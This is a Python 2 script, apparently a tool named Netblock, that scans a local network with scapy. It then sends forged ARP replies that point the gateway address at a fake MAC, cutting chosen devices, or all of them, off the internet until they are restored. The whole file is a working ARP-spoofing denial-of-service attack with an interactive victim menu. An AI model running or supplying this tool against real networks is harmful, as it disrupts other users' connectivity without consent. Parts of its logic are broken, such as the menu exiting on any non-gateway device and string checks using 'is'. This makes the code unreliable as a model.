#!/usr/bin/env python2.7

import time
import os
import sys
import select
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

OKGREEN = '\033[92m'
FAIL = '\033[91m'
ENDC = '\033[0m'
ERROR = FAIL+"ERROR: "+ENDC

refreshing = True # Flag for refreshing
gateway_mac = '12:34:56:78:9A:BC' # A spoofed default gateway mac address
blocked = [] # list of blocked victims
devices = []


def get_ip_macs(ips):
  """
  Returns a list of tupples containing the (ip, mac address)
  of all of the computers on the network
  """
  answers, uans = arping(ips, verbose=0)
  res = []
  for answer in answers:
    mac = answer[1].hwsrc
    ip  = answer[1].psrc
    res.append((ip, mac))
  return res


def poison(victim_ip, victim_mac, gateway_ip):
  """
  Send the victim an ARP packet pairing the gateway ip with the wrong
  mac address
  """
  packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', \
  pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)


def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
  """
  Send an ARP packet to the victim repairing their MAC address with the correct
  IP address.
  """
  packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, \
  hwdst=victim_mac)
  send(packet, verbose=0)


def get_lan_ip():
  """
  Gets the current LAN's IP by connecting to google and extracting the IP from
  the socket.
  """
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("google.com", 80))
  ip = s.getsockname()
  s.close()
  return ip[0]


def printdiv():
  print '--------------------'

def check_for_root():
    """
    Checks that the script was executed under the status of a superuser.
    """
    if os.geteuid() != 0:
      print ERROR+"You need to run the script as a superuser."
      exit()

def get_blocked_victims(victims):
    """
    Prints out the victims that have been blocked. victims is a list of tuples
    that contain {victims ip:victims mac}.
    """
    vics = OKGREEN+"Blocked: ["
    for victim in victims:
        if victims.index(victim) == len(victims)-1:
            vics = vics + victim[0] + " "
        else:
            vics = vics + victim[0] + ", "
    return vics+"]"+ENDC


def get_gateway_ip(gateway_ip=None):
  # Gets the gateway ip. Returns [gateway_ip, ip_range]
  myip = get_lan_ip()
  ip_list = myip.split('.')
  del ip_list[-1]
  ip_list.append('*')
  ip_range = '.'.join(ip_list)
  del ip_list[-1]
  ip_list.append('1')# assumed default gateway is "XXX.XXX.XXX.1"
  if gateway_ip is not None:
    print "Gateway IP provided as "+gateway_ip
    return [gateway_ip, ip_range]
  else:
    return ['.'.join(ip_list), ip_range]


def print_menu(gateway_ip,ip_range):
    """
    Get a list of devices and print them to the screen
    """
    global devices
    global gateway_mac
    devices = get_ip_macs(ip_range)
    printdiv()
    print "Connected ips:"
    i = 0
    for device in devices:
      if device in blocked:
        print '%s%s)\t%s\t%s%s' % (OKGREEN,i, device[0],device[1],ENDC)
      else:
        print '%s)\t%s\t%s' % (i, device[0], device[1])
      # See if we have the gateway MAC
      if device[0] == gateway_ip:
        gateway_mac = device[1]
      else:
          print ERROR+'Gateway '+gateway_ip+' not found. Either Netblock can'+\
          'not affect your router or you have to specify the gateway like so: '+\
          'netblock -g XXX.XXX.XXX.XXX. Try using an arp command to find the ip '+\
          'to your gateway'
          exit()
      i+=1

    printdiv()
    print(get_blocked_victims(blocked))
    print 'Gateway ip:  %s' % gateway_ip
    if gateway_mac != '12:34:56:78:9A:BC':
      print "Gateway mac: %s" % gateway_mac
    else:
      print ERROR+'Gateway not found. Either Netblock can not affect your '+\
      'router or you have to specify the gateway like so: '+\
      'netblock -g XXX.XXX.XXX.XXX. Try using an arp command to find the ip '+\
      'to your gateway'
    printdiv()

    print "Who do you want to block? (Select victim in blocked list to unblock)"
    print "(r - Refresh, a - Kill all, q - quit)"
    sys.stdout.write(">")


def poisoning_loop(gateway_ip, ip_range):
    """
    Iteratively poisons victims in the blocked list.
    """
    try:
        # Print out the menu
        print_menu(gateway_ip,ip_range)
        process_input( raw_input(""), gateway_ip, ip_range )

        while True:
            reads, writes, errors = \
            select.select([sys.stdin] , [], [],)

            for read in reads:
                process_input(sys.stdin.readline().rstrip(), gateway_ip, ip_range)

            for vic in blocked:
                poison(vic[0], vic[1], gateway_ip)
    except KeyboardInterrupt:
        print "Cleaning up...Quitting..."
        cleanup()
        exit()


def process_input(choice, gateway_ip, ip_range):
    """
    Receives the user's input and decides what to do.
    """
    global devices
    # A digit means a single target was chosen
    if choice.isdigit() and int(choice) < len(devices) and int(choice) >= 0:
        refreshing = False
        choice = int(choice)
        victim = devices[choice]
        # add victim to list of blocked targets
        if victim not in blocked:
            blocked.append(victim)
            print "Preventing %s from accessing the internet..." % victim[0]
        else:
            blocked.remove(victim)
            restore(victim[0], victim[1], gateway_ip, gateway_mac)
            print "Restored access to %s ..." % victim[0]


    # Block access for everyone on the list
    elif choice is 'a':
        refreshing = False
        # add all targets to blocked list
        for victim in devices:
            blocked.append(victim)

    # Refresh list of targets
    elif choice is 'r':
        print_menu(gateway_ip,ip_range)

    # Quit
    elif choice is 'q':
        print "Cleaning up...Quitting..."
        cleanup()
        exit()

    else:
        print ERROR+"Invalid input..."

    # reprint the menu
    print_menu(gateway_ip,ip_range)


def cleanup():
    """
    Restores internet connection for all of the victims currently in the blocked
    list.
    """
    for vic in blocked:
        blocked.remove(vic)
        restore(vic[0], vic[1], gateway_ip, gateway_mac)



if __name__=="__main__":

    # Check for root
    check_for_root()


    # Search for targets every time we refresh
    if len(sys.argv) >=2 and sys.argv[1] == '-g':
        gateway_ip, ip_range = get_gateway_ip(gateway_ip=sys.argv[2])
    else:
        gateway_ip, ip_range = get_gateway_ip()

    # enter poisoning loop
    poisoning_loop(gateway_ip,ip_range)
